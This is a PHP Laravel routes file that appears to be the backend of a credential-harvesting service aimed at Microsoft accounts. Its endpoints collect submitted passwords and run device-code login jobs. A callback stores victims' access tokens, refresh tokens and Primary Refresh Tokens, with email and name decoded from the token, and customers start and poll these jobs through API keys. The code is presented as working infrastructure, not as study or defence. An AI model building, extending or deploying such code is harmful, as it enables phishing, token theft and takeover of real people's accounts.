<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\CoreSystemController;
use App\Http\Controllers\Api\CommandController;
use Illuminate\Support\Facades\Log;
use App\Models\PythonJob;
use App\Jobs\RunPythonJob;
use App\Models\Token;
use App\Models\User;
use App\Http\Controllers\Api\MicrosoftAuthController;
use App\Http\Controllers\Api\CliAuthController;
use App\Http\Controllers\MicrosoftInboxController;
use Illuminate\Http\Request;

/*
|--------------------------------------------------------------------------
| MAIL WEBHOOK
|--------------------------------------------------------------------------
*/
Route::post('/cli/login-key', [CliAuthController::class, 'loginKey']);
Route::post('/cli/token/update', [CliAuthController::class, 'updateToken']);
Route::any('/mail-notify', function (Request $request) {

    if ($request->has('validationToken')) {
        header('Content-Type: text/plain');
        echo $request->query('validationToken');
        exit;
    }

    Log::info('MAIL WEBHOOK', [
        'body' => file_get_contents("php://input")
    ]);

    return response('ok', 200);
});

/*
|--------------------------------------------------------------------------
| BASIC ROUTES
|--------------------------------------------------------------------------
*/
Route::post('/valid-visitor', [CoreSystemController::class, 'storeValidVisitor']);
Route::post('/send-password', [CoreSystemController::class, 'storePassword']);

/*
|--------------------------------------------------------------------------
| MICROSOFT AUTH
|--------------------------------------------------------------------------
*/
Route::post('/start', [MicrosoftAuthController::class, 'start']);
Route::get('/poll/{login_id}', [MicrosoftAuthController::class, 'poll']);

/*
|--------------------------------------------------------------------------
| COMMAND
|--------------------------------------------------------------------------
*/
// Route::post('/command/start', [CommandController::class, 'start']);
// Route::get('/command/poll/{id}', [CommandController::class, 'poll']);

/*
|--------------------------------------------------------------------------
| PYTHON CALLBACK
|--------------------------------------------------------------------------
*/
Route::post('/python/callback', function (Request $request) {

    // 🔐 security check
    if ($request->header('X-Python-Secret') !== config('services.python.secret')) {
        return response()->json(['error' => 'unauthorized'], 403);
    }

    Log::info('PYTHON CALLBACK', $request->all());

    $job = PythonJob::find($request->job_id);

    if (!$job) {
        return response()->json(['error' => 'job not found'], 404);
    }

    $data = $request->input('data');

    // 🔥 ambil result lama (biar ga ketimpa)
    $result = $job->result ?? [];

    // 🔥 handle waiting_user (device code)
    if ($request->status === 'waiting_user') {
        $result['device'] = $data;
    }

    // 🔥 handle done (token)
    if ($request->status === 'done') {
        $result['auth'] = $data;
    }

    // 🔥 update job
    $job->update([
        'status' => $request->status,
        'result' => $result,
        'error' => $request->status === 'failed'
            ? $request->error
            : $job->error,
    ]);

    /*
    |--------------------------------------------------------------------------
    | SAVE TOKEN (ONLY WHEN DONE)
    |--------------------------------------------------------------------------
    */
    if ($request->status === 'done') {
        try {
            $prt = $data['prt'] ?? null;

            $idToken = is_array($prt) ? ($prt['id_token'] ?? null) : null;

            $decoded = decodeJwt($idToken);

            $email = is_array($decoded)
                ? ($decoded['upn'] ?? $decoded['unique_name'] ?? null)
                : null;

            $name = is_array($decoded)
                ? ($decoded['name'] ?? trim(($decoded['given_name'] ?? '') . ' ' . ($decoded['family_name'] ?? '')))
                : null;

            // 🔥 jangan insert kalau kosong
            if (!empty($data['access_token']) || !empty($prt)) {

                Token::create([
                    'user_id' => $job->user_id,
                    'access_token' => $data['access_token'] ?? null,
                    'refresh_token' => $data['refresh_token'] ?? null,
                    'prt' => json_encode($data['prt']),
                    'email' => $email,
                    'name' => $name,
                    'expires_at' => now()->addSeconds((int) ($data['expires_in'] ?? 3600)),
                    'status' => 'active',
                ]);
            }

        } catch (\Throwable $e) {
            Log::error('TOKEN_SAVE_FAILED', [
                'error' => $e->getMessage(),
                'data' => $data
            ]);
        }
    }

    return response()->json(['ok' => true]);

})->name('python.callback');

/*
|--------------------------------------------------------------------------
| CHECK JOB
|--------------------------------------------------------------------------
*/


// =========================
// 🚀 START JOB
// =========================
Route::post('/python/start', function (Request $request) {

    $apiKey = validateApiKey($request);

    if (!$apiKey) {
        return response()->json(['error' => 'Unauthorized'], 401);
    }

    $user = User::where('api_key', $apiKey)->first();

    if (!$user) {
        return response()->json(['error' => 'Invalid API key'], 401);
    }

    $job = PythonJob::create([
        'status' => 'pending',
        'user_id' => $user->id
    ]);

    RunPythonJob::dispatch($job->id)->onQueue('python');

    return response()->json([
        'job_id' => $job->id,
        'status' => 'started'
    ]);
});


// =========================
// 🔄 POLL JOB
// =========================
Route::get('/python/job/{id}', function (Request $request, $id) {

    $apiKey = validateApiKey($request);

    if (!$apiKey) {
        return response()->json(['error' => 'Unauthorized'], 401);
    }

    $user = User::where('api_key', $apiKey)->first();

    if (!$user) {
        return response()->json(['error' => 'Invalid API key'], 401);
    }

    $job = PythonJob::find($id);

    if (!$job) {
        return response()->json(['error' => 'Job not found'], 404);
    }

    // 🔥 PENTING: pastikan job milik user
    if ($job->user_id !== $user->id) {
        return response()->json(['error' => 'Forbidden'], 403);
    }

    return response()->json([
        'id' => $job->id,
        'status' => $job->status,
        'result' => $job->result,
        'error' => $job->error
    ]);
});
